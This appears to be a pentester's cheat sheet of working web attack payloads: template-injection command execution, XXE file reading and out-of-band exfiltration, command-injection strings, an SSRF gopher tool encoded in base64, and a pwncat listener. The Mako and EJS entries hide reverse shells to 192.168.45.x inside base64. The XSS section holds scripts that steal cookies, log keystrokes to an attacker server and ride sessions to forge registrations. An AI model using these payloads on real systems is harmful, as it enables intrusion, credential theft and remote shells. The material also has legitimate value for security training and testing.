

# File traversal 
## Intruder
```
/etc/passwd
/etc/group
/etc/shadow
/Windows/System32/Drivers/etc/hosts
/windows/win.ini
```
# SSTI 
## Twig (PHP) 
```
#Discovery
{{5*5}} => 25
{{5*'5'}} => 25

{% set name = 'Fabien' %}
This is              {{-name-}} => This isFabien

#Exploitation 
{{[0]|reduce('system','whoami')}}
```

## Apache Freemarker 
```
# Discovery
${7*7} => 49
${7*'7'} => Generates error
-Can interpret HTML tags such as <i>, <b> etc 

<#assign x = 1>
<h1>Hello ${name}!</h1>

# Exploitation
${"freemarker.template.utility.Execute"?new()("whoami")}
```

## Pug (javascript JS: Express, node)
```
# Discovery 

#{"8"*8} => 49

// Assign variable
- secret = ['a','b', 'c'] // code should be executed by the JavaScript engine and the output should not be displayed
= secret = ['a','b', 'c'] // run as buffered code

# Exploitation
- var require = global.process.mainModule.require
= require('child_process')

- var require = global.process.mainModule.require
= require('child_process').spawnSync('whoami').stdout
```

## Jinja (Python) 
``` 
# Discovery

{{4*5}} => 25
{{5*"5"}} => 55555

Flask variables: config, request, session, g, url_for(), and get_flashed_messages()
Ex: 
{{ request }} 
{{config|pprint}}

```

## Mako 
```
${6*6}
#####
<%
import os
x=os.popen('id').read()
%>
${x}
#####
${self.module.cache.util.os.system("echo -n c2ggLWkgPiYgL2Rldi90Y3AvMTkyLjE2OC40NS4yMjAvMTIzNCAwPiYx | base64 -d | bash")}
```
## Mustache ( Java, .NET, PHP, and more.)
```
{{#each (readdir "/etc")}}
	{{this}}
{{/each}}


{{read "/etc/passwd"}}

```

## EJS 
```
# whoami
<%=  eval(atob('cHJvY2Vzcy5tYWluTW9kdWxlLnJlcXVpcmUoJ2NoaWxkX3Byb2Nlc3MnKS5leGVjU3luYygnd2hvYW1pJykK')); %>
<%=  eval(atob('cHJvY2Vzcy5tYWluTW9kdWxlLnJlcXVpcmUoJ2NoaWxkX3Byb2Nlc3MnKS5leGVjU3luYygnZWNobyBMMkpwYmk5aVlYTm9JQzFwSUQ0bUlDOWtaWFl2ZEdOd0x6RTVNaTR4TmpndU5EVXVNakl3THpFeU16UWdNRDRtTVFvPSB8IGJhc2U2NCAtZCB8IGJhc2gnKQo=')); %>

#payload 
process.mainModule.require('child_process').execSync('echo -n YmFzaCAtYyAnZXhlYyBiYXNoIC1pICY+L2Rldi90Y3AvMTkyLjE2OC40NS4yMzcvMTIzNCA8JjEnCg== | base64 -d | bash')
```
## Intruder
```
{{5*5}}
${7*7}
#{"8"*8}
```
# XXE

## Example

```
<?xml version="1.0" ?>
<!DOCTYPE data [
<!ELEMENT data ANY >
<!ENTITY lastname "Replaced">
]>
<Contact>
  <lastName>&lastname;</lastName>
  <firstName>Tom</firstName>
</Contact>

```
## Reading files
```
<?xml version="1.0"?>
<!DOCTYPE data [
<!ELEMENT data ANY >
<!ENTITY lastname SYSTEM "file:///etc/passwd">
]>
<Contact>
  <lastName>&lastname;</lastName>
  <firstName>Tom</firstName>
</Contact>
```

## Error-based Testing
```
#Testing for example long text (/etc/passwd) in string place (lastname)

<!DOCTYPE data [
<!ELEMENT data ANY >
<!ENTITY xxe  SYSTEM "file:///etc/passwd">
]>
<entity-engine-xml>
<Product createdTxStamp="2021-06-04 08:15:48.983" internalName="Giant Widget variant explosion" isVariant="N" isVirtual="Y" largeImageUrl="/images/products/WG-9943/large.png" lastUpdatedStamp="2021-06-04 08:16:18.521" lastUpdatedTxStamp="2021-06-04 08:16:18.258" primaryProductCategoryId="202" productId="XXE-0001" productName="Giant Widget with variant explosion" productTypeId="FINISHED_GOOD" productWeight="22.000000" quantityIncluded="10.000000" smallImageUrl="/images/products/WG-9943/small.png" virtualVariantMethodEnum="VV_VARIANTTREE">
<createdStamp>2021-06-04 08:15:49</createdStamp>
<description>&xxe;</description>
<longDescription>XXE</longDescription>
</Product>
</entity-engine-xml>
```

## Out-of-Band Testing
```
<?xml version="1.0"?>
<!DOCTYPE data [
<!ELEMENT data ANY >
<!ENTITY lastname SYSTEM "http://<our ip address>/somefile">
]>
<Contact>
  <lastName>&lastname;</lastName>
  <firstName>Tom</firstName>
</Contact>

Example

<?xml version="1.0" encoding="utf-8"?> 
<!DOCTYPE oob [
<!ENTITY % base SYSTEM "http://your ip address/external.dtd"> 
%base;
%external;
%exfil;
]>
<entity-engine-xml>
</entity-engine-xml>


Content of external.dtd 
<!ENTITY % content SYSTEM "file:///etc/timezone">
<!ENTITY % external "<!ENTITY &#37; exfil SYSTEM 'http://your ip address/out?%content;'>" >
```

# XSS 
## Probing
```
<script src="http://192.168.45.157:8000/hello.js"></script>
<script> (new Image).src="http://192.168.45.157:8000/exfil?onSuccessData="; </script>
```
## Exploitation script 
### Showing source code | cookie | keylog
```
var i="192.168.45.157:8000";
var d=btoa(JSON.stringify({
//l:JSON.stringify(localStorage),
//code:document.documentElement.outerHTML,
cookie:document.cookie
}));
(new Image).src="http://"+i+"/exfil?data="+d;

function logKey(event){
    fetch("http://"+i+"/k?key=" + event.key)
}

document.addEventListener('keydown', logKey);

```
### Session riding 
```
var xss_c2c_ip = "192.168.45.157:8000";
var get_url = "/register";
var post_url="/loginLogout";

function onSuccess(data) {
  (new Image).src="http://"+xss_c2c_ip+"/exfil?onSuccessData="+data;   
}

function onError(err) {
  (new Image).src="http://"+xss_c2c_ip+"/exfil?onErrorData="+err;
}

fetch(get_url, {mode: 'no-cors',credentials: 'include'})
  .then(res => {
    if (!res.ok) throw new Error("HTTP status " + res.status);
    return res.text();
  })
  .then(html => {
    var parser = new DOMParser();
    var doc = parser.parseFromString(html, "text/html");
    var tokenInput = doc.querySelector('input[name="_token"]');
    if (tokenInput) {

      var token = btoa(JSON.stringify({ token: tokenInput.value }));
      onSuccess(token);

      const xhr = new XMLHttpRequest();
      xhr.open("POST", post_url, true);
      xhr.withCredentials = true;
  
      xhr.onload = function () {
        if (xhr.status === 200) {
          var data_response = btoa(JSON.stringify({
              success:xhr.responseText
              }));
          onSuccess(data_response);
        } else {
          //console.error("Failed:", xhr.status, xhr.statusText);
          var data_response = btoa(JSON.stringify({
              error:xhr.responseText
              }));
          onError(data_response);
        }
      };
  
      const formData = new FormData();
      formData.append("_token", token);
      formData.append("username", "test2");
      formData.append("password", "test2");
      formData.append("firstName", "test2");
      formData.append("lastName", "test2");
      formData.append("email", "test2@test.com");
      formData.append("dType", "isRegister");
      formData.append("type", "100");
  
      xhr.send(formData);
  

    } else {
      throw new Error("Token input not found");
    }
  })
  .catch(onError);

```

# SSRF
```
#SSRF2gopher
python3.9 /opt/SSRF2gopher/SSRF2gopher.py -u 0.0.0.0 -p 80 -e /api/admin/create -m POST -d "username=admin5&password=admin5" -H "User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36
Content-Type: application/x-www-form-urlencoded;charset=UTF-8"

#Base64 content of SSRF2gopher.py
IyEvdXNyL2Jpbi9weXRob24zCmltcG9ydCB1cmxsaWIucGFyc2UKaW1wb3J0IGFyZ3BhcnNlCmltcG9ydCBzeXMKCmRlZiBiYW5uZXIoKToKICAgIGJhbm5lciA9ICcnJwogICBfX19fX19fX19fXyAgX19fX19fXyAgICAgICAgICAgICAgICAgX18gICAgICAgICAgCiAgLyBfXy8gX18vIF8gXFwvIF9fL18gIHxfX18gX19fXyAgX19fICAvIC8gIF9fXyBfX19fCiBfXFwgXFxfXFwgXFwvICwgXy8gXy8vIF9fLy8gXyBgLyBfIFxcLyBfIFxcLyBfIFxcLyAtXykgX18vCi9fX18vX19fL18vfF8vXy8gL19fX18vXFxfLCAvXFxfX18vIC5fXy9fLy9fL1xcX18vXy8gICAKICAgICAgICAgICAgICAgICAgICAgIC9fX18vICAgIC9fLyAgICAgICAgICAgICAgICAgIAoKQ3JlYXRlZCBieSBlTVZlZSAKICAgICcnJwogICAgcmV0dXJuIGJhbm5lcgoKZGVmIHVybF9lbmNvZGVfcGF5bG9hZChkYXRhKToKICAgIGVuY29kZWRfZGF0YSA9IGRhdGEucmVwbGFjZSgnICcsICclMjAnKS5yZXBsYWNlKCc9JywgJyUzZCcpLnJlcGxhY2UoJyYnLCAnJTI2JykKICAgIGVuY29kZWRfZGF0YSA9IGVuY29kZWRfZGF0YS5yZXBsYWNlKCdcbicsICclMGEnKQogICAgcmV0dXJuIGVuY29kZWRfZGF0YQoKZGVmIGRvdWJsZV91cmxfZW5jb2RlX3BheWxvYWQoZGF0YSk6CiAgICBlbmNvZGVkX2RhdGEgPSBkYXRhLnJlcGxhY2UoJzonLCAnJTNhJykucmVwbGFjZSgnJTIwJywgJyUyNTIwJykKICAgIGVuY29kZWRfZGF0YSA9IGVuY29kZWRfZGF0YS5yZXBsYWNlKCclMGEnLCAnJTI1MGEnKQogICAgcmV0dXJuIGVuY29kZWRfZGF0YQoKZGVmIGFub3RoZXJfb3B0aW9uKGRhdGEpOgogICAgZW5jb2RlZF9kYXRhID0gZGF0YS5yZXBsYWNlKCc6JywgJyUzYScpLnJlcGxhY2UoJy8nLCAnJTJGJykucmVwbGFjZSgnJTIwJywgJyUyNTIwJykKICAgIGVuY29kZWRfZGF0YSA9IGVuY29kZWRfZGF0YS5yZXBsYWNlKCclMGEnLCAnJTI1MGEnKQogICAgcmV0dXJuIGVuY29kZWRfZGF0YQoKZGVmIGhvc3RfaGVhZGVyKGhvc3QpOgogICAgcmV0dXJuICJIb3N0OiAiICsgaG9zdAoKZGVmIGdlbmVyYXRlX2dvcGhlcl9yZXF1ZXN0KGhvc3QsIHBvcnQsIGVuZHBvaW50LCBtZXRob2QpOgogICAgcmV0dXJuIGYiZ29waGVyOi8ve2hvc3R9Ontwb3J0fS9fe21ldGhvZH0ge2VuZHBvaW50fSBIVFRQLzEuMSIKCmRlZiBnZW5lcmF0ZV9nb3BoZXJfcGF5bG9hZChob3N0LCBwb3J0LCBlbmRwb2ludCwgY3VzdG9tX2hlYWRlcnMsIG1ldGhvZCwgYm9keT1Ob25lKToKICAgIHBheWxvYWQgPSBnZW5lcmF0ZV9nb3BoZXJfcmVxdWVzdChob3N0LCBwb3J0LCBlbmRwb2ludCwgbWV0aG9kKSArICJcbiIKICAgIHBheWxvYWQgKz0gaG9zdF9oZWFkZXIoaG9zdCkgKyAiXG4iCgogICAgIyBBZGQgQ29udGVudC1MZW5ndGggYXV0b21hdGljYWxseSBpZiBib2R5IGlzIHByZXNlbnQgYW5kIG5vdCBhbHJlYWR5IHNwZWNpZmllZAogICAgaWYgYm9keSBhbmQgbm90IGFueShoLmxvd2VyKCkgPT0gImNvbnRlbnQtbGVuZ3RoIiBmb3IgaCBpbiBjdXN0b21faGVhZGVycyk6CiAgICAgICAgY3VzdG9tX2hlYWRlcnNbIkNvbnRlbnQtTGVuZ3RoIl0gPSBzdHIobGVuKGJvZHkuZW5jb2RlKCkpKQoKICAgIGZvciBoZWFkZXIsIHZhbHVlIGluIGN1c3RvbV9oZWFkZXJzLml0ZW1zKCk6CiAgICAgICAgcGF5bG9hZCArPSBmIntoZWFkZXJ9OiB7dmFsdWV9XG4iCgogICAgcGF5bG9hZCArPSAiXG4iICAjIFNlcGFyYXRlIGhlYWRlcnMgZnJvbSBib2R5CgogICAgaWYgYm9keToKICAgICAgICBwYXlsb2FkICs9IGJvZHkKCiAgICByZXR1cm4gcGF5bG9hZAoKZGVmIHBhcnNlX2hlYWRlcnMoaGVhZGVyc19saXN0KToKICAgIGN1c3RvbV9oZWFkZXJzID0ge30KICAgIGlmIGhlYWRlcnNfbGlzdDoKICAgICAgICBmb3IgaGVhZGVyIGluIGhlYWRlcnNfbGlzdDoKICAgICAgICAgICAgdHJ5OgogICAgICAgICAgICAgICAgbmFtZSwgdmFsdWUgPSBoZWFkZXIuc3BsaXQoJzonLCAxKQogICAgICAgICAgICAgICAgY3VzdG9tX2hlYWRlcnNbbmFtZS5zdHJpcCgpXSA9IHZhbHVlLnN0cmlwKCkKICAgICAgICAgICAgZXhjZXB0IFZhbHVlRXJyb3I6CiAgICAgICAgICAgICAgICBwcmludChmIlshXSBJbnZhbGlkIGhlYWRlciBmb3JtYXQ6IHtoZWFkZXJ9IikKICAgICAgICAgICAgICAgIHByaW50KCJIZWFkZXJzIHNob3VsZCBiZSBpbiB0aGUgZm9ybWF0ICdOYW1lOlZhbHVlJyIpCiAgICAgICAgICAgICAgICBzeXMuZXhpdCgxKQogICAgcmV0dXJuIGN1c3RvbV9oZWFkZXJzCgpkZWYgbWFpbigpOgogICAgcGFyc2VyID0gYXJncGFyc2UuQXJndW1lbnRQYXJzZXIoZGVzY3JpcHRpb249J0dvcGhlciBwYXlsb2FkIGdlbmVyYXRvciB3aXRoIGN1c3RvbSBoZWFkZXJzIGFuZCBib2R5IHN1cHBvcnQnKQogICAgcGFyc2VyLmFkZF9hcmd1bWVudCgnLXUnLCAnLS1ob3N0JywgaGVscD0nVGFyZ2V0IGhvc3QgYWRkcmVzcycpCiAgICBwYXJzZXIuYWRkX2FyZ3VtZW50KCctcCcsICctLXBvcnQnLCBoZWxwPSdHb3BoZXIgcG9ydCBudW1iZXInKQogICAgcGFyc2VyLmFkZF9hcmd1bWVudCgnLWUnLCAnLS1lbmRwb2ludCcsIGhlbHA9J1RhcmdldCBlbmRwb2ludCcpCiAgICBwYXJzZXIuYWRkX2FyZ3VtZW50KCctSCcsICctLWhlYWRlcnMnLCBuYXJncz0nKicsIGhlbHA9J0N1c3RvbSBoZWFkZXJzIGluIGZvcm1hdCAiTmFtZTpWYWx1ZSInKQogICAgcGFyc2VyLmFkZF9hcmd1bWVudCgnLW0nLCAnLS1tZXRob2QnLCBoZWxwPSdIVFRQIG1ldGhvZCAoR0VULCBQT1NULCBQVVQsIGV0Yy4pJykKICAgIHBhcnNlci5hZGRfYXJndW1lbnQoJy1kJywgJy0tZGF0YScsIGhlbHA9J0RhdGEgcGF5bG9hZC9ib2R5IGNvbnRlbnQgKGUuZy4sIFBPU1QgYm9keSknKQoKICAgIGFyZ3MgPSBwYXJzZXIucGFyc2VfYXJncygpCgogICAgcHJpbnQoYmFubmVyKCkpCgogICAgaG9zdCA9IGFyZ3MuaG9zdCBvciBpbnB1dCgiWz9dIFdoYXQgaXMgdGhlIGFkZHJlc3Mgb2YgdGhlIEhvc3Q/ICIpCiAgICBwb3J0ID0gYXJncy5wb3J0IG9yIGlucHV0KCJbP10gV2hhdCBwb3J0IHNob3VsZCBiZSB1c2VkIGZvciBnb3BoZXI/ICIpCiAgICBlbmRwb2ludCA9IGFyZ3MuZW5kcG9pbnQgb3IgaW5wdXQoIls/XSBXaGF0IGVuZHBvaW50IHNob3VsZCBiZSB1c2VkIGZvciBnb3BoZXI/ICIpCiAgICBtZXRob2QgPSAoYXJncy5tZXRob2Qgb3IgaW5wdXQoIls/XSBXaGF0IEhUVFAgbWV0aG9kIHNob3VsZCBiZSB1c2VkPyAoR0VULCBQT1NULCBQVVQsIGV0Yy4pICIpKS51cHBlcigpIG9yICJHRVQiCiAgICBib2R5ID0gYXJncy5kYXRhCgogICAgIyBDdXN0b20gaGVhZGVycwogICAgaWYgYXJncy5oZWFkZXJzOgogICAgICAgIGN1c3RvbV9oZWFkZXJzID0gcGFyc2VfaGVhZGVycyhhcmdzLmhlYWRlcnMpCiAgICBlbHNlOgogICAgICAgIGN1c3RvbV9oZWFkZXJzID0ge30KICAgICAgICBpZiBpbnB1dCgiWz9dIFdvdWxkIHlvdSBsaWtlIHRvIGFkZCBjdXN0b20gaGVhZGVycz8gKHkvbik6ICIpLmxvd2VyKCkgPT0gJ3knOgogICAgICAgICAgICB3aGlsZSBUcnVlOgogICAgICAgICAgICAgICAgdXNlcl9pbnB1dCA9IGlucHV0KCJbP10gRW50ZXIgaGVhZGVyIChvciBwcmVzcyBlbnRlciB0byBmaW5pc2gpOiAiKS5zdHJpcCgpCiAgICAgICAgICAgICAgICBpZiBub3QgdXNlcl9pbnB1dDoKICAgICAgICAgICAgICAgICAgICBicmVhawogICAgICAgICAgICAgICAgdHJ5OgogICAgICAgICAgICAgICAgICAgIGhlYWRlciwgdmFsdWUgPSB1c2VyX2lucHV0LnNwbGl0KCI6IiwgMSkKICAgICAgICAgICAgICAgICAgICBjdXN0b21faGVhZGVyc1toZWFkZXIuc3RyaXAoKV0gPSB2YWx1ZS5zdHJpcCgpCiAgICAgICAgICAgICAgICBleGNlcHQgVmFsdWVFcnJvcjoKICAgICAgICAgICAgICAgICAgICBwcmludCgiWyFdIEludmFsaWQgZm9ybWF0LiBVc2UgJ05hbWU6VmFsdWUnIikKCiAgICB0cnk6CiAgICAgICAgcHJpbnQoIlxuWyFdIFBsYWluIHRleHQgcGF5bG9hZDpcbiIpCiAgICAgICAgcGF5bG9hZCA9IGdlbmVyYXRlX2dvcGhlcl9wYXlsb2FkKGhvc3QsIHBvcnQsIGVuZHBvaW50LCBjdXN0b21faGVhZGVycywgbWV0aG9kLCBib2R5KQogICAgICAgIHByaW50KHBheWxvYWQpCgogICAgICAgIGVuY29kZWRfcGF5bG9hZCA9IHVybF9lbmNvZGVfcGF5bG9hZChwYXlsb2FkKQogICAgICAgIHByaW50KCJcblshXSBVUkwgZW5jb2RlZCBwYXlsb2FkOiIpCiAgICAgICAgcHJpbnQoZW5jb2RlZF9wYXlsb2FkKQoKICAgICAgICBwcmludCgiXG5bIV0gRG91YmxlIFVSTCBlbmNvZGVkIHBheWxvYWQ6IikKICAgICAgICBwcmludChkb3VibGVfdXJsX2VuY29kZV9wYXlsb2FkKGVuY29kZWRfcGF5bG9hZCkpCgogICAgICAgIHByaW50KCJcblshXSBBbm90aGVyIG9wdGlvbiB0aGF0IG1pZ2h0IHdvcmsgdmlhIHNvbWV0aGluZyBsaWtlIEJVUlA6IikKICAgICAgICBwcmludChhbm90aGVyX29wdGlvbihlbmNvZGVkX3BheWxvYWQpKQoKICAgIGV4Y2VwdCBLZXlib2FyZEludGVycnVwdDoKICAgICAgICBwcmludCgiXG5bIV0gU2NyaXB0IGludGVycnVwdGVkIGJ5IHVzZXIuIEV4aXRpbmcuLi4iKQogICAgICAgIHN5cy5leGl0KDEpCgppZiBfX25hbWVfXyA9PSAiX19tYWluX18iOgogICAgbWFpbigpCg==
```
# OS command injection payload 
```
|whoami
||whoami
|id
;id
;whoami
&whoami
&&whoami
```

## Pwncat
```
pwncat-cs -lp 1234
```
# Misc 
## Enumeration command 
```
feroxbuster -u http://192.168.228.121/ -x php js txt aspx
cewl  -w output.txt http://192.168.166.121/
```